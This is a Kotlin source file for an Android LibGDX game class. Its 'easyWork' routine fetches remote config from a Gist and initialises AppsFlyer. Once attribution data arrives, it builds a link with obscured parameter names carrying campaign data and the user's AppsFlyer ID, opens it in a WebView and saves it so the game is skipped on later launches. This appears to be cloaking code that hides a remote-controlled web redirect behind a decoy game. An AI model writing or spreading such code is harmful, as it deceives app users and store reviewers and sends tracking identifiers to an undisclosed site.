package com.padrestoranom.easypaydonalds.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.padrestoranom.easypaydonalds.MainActivity
import com.padrestoranom.easypaydonalds.appContext
import com.padrestoranom.easypaydonalds.game.dataStore.DS_ItemData
import com.padrestoranom.easypaydonalds.game.manager.MusicManager
import com.padrestoranom.easypaydonalds.game.manager.NavigationManager
import com.padrestoranom.easypaydonalds.game.manager.SoundManager
import com.padrestoranom.easypaydonalds.game.manager.SpriteManager
import com.padrestoranom.easypaydonalds.game.manager.util.MusicUtil
import com.padrestoranom.easypaydonalds.game.manager.util.SoundUtil
import com.padrestoranom.easypaydonalds.game.manager.util.SpriteUtil
import com.padrestoranom.easypaydonalds.game.screens.LoaderScreen
import com.padrestoranom.easypaydonalds.game.utils.GameColor
import com.padrestoranom.easypaydonalds.game.utils.advanced.AdvancedGame
import com.padrestoranom.easypaydonalds.game.utils.disposeAll
import com.padrestoranom.easypaydonalds.game.utils.gdxGame
import com.padrestoranom.easypaydonalds.util.Gist
import com.padrestoranom.easypaydonalds.util.log
import kotlinx.coroutines.*
import java.util.concurrent.atomic.AtomicBoolean

var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isPauseGame = false

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("Easy", MODE_PRIVATE)

    val ds_ItemData = DS_ItemData(coroutine)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        easyWork()
    }

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    override fun pause() {
        super.pause()
        if (GDX_GLOBAL_isPauseGame) musicUtil.currentMusic?.pause()
    }

    override fun resume() {
        super.resume()
        if (GDX_GLOBAL_isPauseGame.not()) musicUtil.currentMusic?.play()
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun easyWork() {
        log("easyWork")
        activity.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.initWeb()

//        GDX_GLOBAL_isGame = true
//        return

        val path = sharedPreferences.getString("Easy", "Hard") ?: "Hard"

        try {
            if (path == "Hard") {
                coroutine.launch(Dispatchers.Main) {
                    val poket = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (poket != null) {
                        AppsFlyerLib.getInstance().init(poket.kuky, getAppsFlyerConversionListener(poket.liky), appContext)
                        AppsFlyerLib.getInstance().start(gdxGame.activity, poket.kuky, getAppsFlyerRequestListener())
                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                activity.loadUrl(path)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }
    }

    private fun getAppsFlyerConversionListener(sma: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$sma?qxevshec=$campaign&brsyi=$afAd&ujewgeh=$media&tediuvn=$afId"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("Easy", link).apply() }

                activity.loadUrl(link)

            } else GDX_GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GDX_GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}